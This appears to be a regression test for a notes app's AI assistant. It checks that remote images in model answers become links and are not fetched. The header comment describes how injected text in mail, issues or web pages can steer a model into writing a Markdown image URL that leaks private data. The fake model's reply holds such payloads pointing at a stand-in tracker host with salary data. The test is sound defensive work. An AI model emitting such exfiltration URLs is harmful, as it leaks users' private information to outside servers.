// q124 R3C-1: an answer of the assistant showed a Markdown image from another server as an image,
// so the WebView fetched it the moment the answer appeared (the CSP allows https images for notes).
// Its address can carry what the model read: text in a mail, a Jira issue or a web page can steer
// even the local model with a private page into writing `![](https://…?d=<the private text>)`.
// Now a remote image of an answer is a link to it, and an answer saved as a page carries a link.

import { test as nodeTest, before, after } from "node:test";
import assert from "node:assert/strict";
import { launch, guarded } from "../lib/harness.js";
import { startFakeOpenAI } from "../lib/fake-openai.js";

const test = guarded(nodeTest, () => app);
let app, ai;
const flat = (nodes) => nodes.flatMap((n) => [n, ...flat(n.children ?? [])]);
const LEAK = "https://tracker.invalid/p.png?d=Gehalt-92000";

before(async () => {
  ai = await startFakeOpenAI({
    port: 4877,
    kind: "openai",
    name: "Lokal",
    models: ["lokal-modell"],
    respond: () => `Zusammenfassung fertig. ![Logo](${LEAK}) <img src="${LEAK}&raw=1" alt="roh"> Ende.`,
  });
  app = await launch();
  const view = await app.invoke("settings_get");
  const provider = { id: "lokal", name: "Lokal", kind: "openai", base_url: `${ai.url}/v1`, local: true, enabled: true, bypass_proxy: true, api_version: "", models: [] };
  await app.invoke("settings_save", {
    settings: {
      ...view.settings,
      providers: [provider],
      router: { ...view.settings.router, local_provider: "lokal", local_model: "lokal-modell", standard_provider: "lokal", standard_model: "lokal-modell", reasoning_provider: "lokal", reasoning_model: "lokal-modell" },
      embedding_model: null,
    },
  });
  await app.reload();
});
after(async () => {
  await app?.close();
  await ai?.close();
});

test("a remote image in an answer is a link, not an image the WebView fetches", async () => {
  await app.waitFor(".assistant .composer textarea");
  const ta = await app.$(".assistant .composer textarea");
  await ta.setValue("Fasse meine Notizen zusammen");
  await app.keys(["Enter"]);
  await app.browser.waitUntil(async () => (await app.browser.execute(() => document.querySelector(".assistant .msg-ai .prose")?.textContent ?? "")).includes("Ende."), {
    timeout: 15000,
    timeoutMsg: "no answer",
  });
  await app.browser.waitUntil(async () => (await app.$$(".assistant .send-btn.stop")).length === 0, { timeout: 15000, timeoutMsg: "the panel stays busy" });
  const dom = await app.browser.execute(() => {
    const prose = document.querySelector(".assistant .msg-ai .prose");
    return {
      images: [...prose.querySelectorAll("img, image, [srcset], [poster]")].map((e) => e.outerHTML),
      links: [...prose.querySelectorAll("a.ai-remote-image")].map((a) => a.getAttribute("href")),
      // What the WebView requested from the tracker (nothing must be there).
      fetched: performance.getEntriesByType("resource").map((r) => r.name).filter((n) => n.includes("tracker.invalid")),
    };
  });
  assert.deepEqual(dom.images, [], JSON.stringify(dom));
  assert.deepEqual(dom.fetched, []);
  // The raw <img> of an answer is shown as text (the chat renders no HTML of the model).
  assert.deepEqual(dom.links, [LEAK]);

  // „Als Seite speichern“: the page holds a link, no image.
  const known = new Set(flat(await app.invoke("workspace_tree")).map((p) => p.id));
  await app.click(".assistant .msg-ai [aria-label='Als Seite speichern']");
  let page;
  await app.browser.waitUntil(
    async () => {
      page = flat(await app.invoke("workspace_tree")).find((p) => !known.has(p.id));
      return !!page;
    },
    { timeout: 10000, timeoutMsg: "no page saved" },
  );
  const doc = await app.invoke("page_get", { id: page.id });
  assert.ok(doc.content.includes(`[Logo](${LEAK})`), doc.content);
  assert.doesNotMatch(doc.content, /!\[[^\]]*\]\(https:|<img/i, doc.content);
  assert.deepEqual(await app.consoleErrors(), []);
});
